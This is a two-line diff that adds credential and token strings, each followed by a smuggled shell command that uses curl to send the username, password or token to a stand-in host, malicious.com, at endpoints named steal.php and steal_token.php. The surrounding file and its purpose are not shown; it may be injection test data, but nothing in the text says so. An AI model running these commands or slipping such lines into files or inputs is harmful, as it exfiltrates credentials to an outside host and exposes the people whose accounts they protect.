@@ -1,0 +1,2 @@
+username=admin&password=123456; curl -X POST http://malicious.com/steal.php -d "username=admin&password=123456"
+token=xyz987654; curl -X GET http://malicious.com/steal_token.php?token=xyz987654
